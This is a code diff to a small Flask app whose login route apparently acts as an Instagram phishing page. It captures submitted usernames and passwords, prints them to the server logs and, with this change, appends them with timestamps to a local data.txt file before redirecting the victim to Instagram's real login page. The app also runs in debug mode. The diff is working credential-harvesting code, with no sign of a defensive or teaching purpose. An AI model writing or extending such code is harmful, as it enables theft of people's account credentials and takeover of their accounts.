@@ -1,4 +1,5 @@
 from flask import Flask, request, redirect, render_template_string
+import datetime
 
 app = Flask(__name__)
 
@@ -82,12 +83,16 @@ def login():
         username = request.form.get("username")
         password = request.form.get("password")
 
-        # 🖨️ Print to Render logs
-        print("====================================")
-        print(f"USERNAME: {username}")
-        print(f"PASSWORD: {password}")
-        print("====================================")
+        # 🖨️ Print to logs
+        print(f"USERNAME: {username}, PASSWORD: {password}")
+
+        # 📝 Save into data.txt (in the same folder as app.py)
+        with open("data.txt", "a") as f:
+            f.write(f"{datetime.datetime.now()} | USERNAME: {username} | PASSWORD: {password}\n")
 
         return redirect("https://www.instagram.com/accounts/login/")
 
     return render_template_string(html_page)
+
+if __name__ == "__main__":
+    app.run(debug=True)
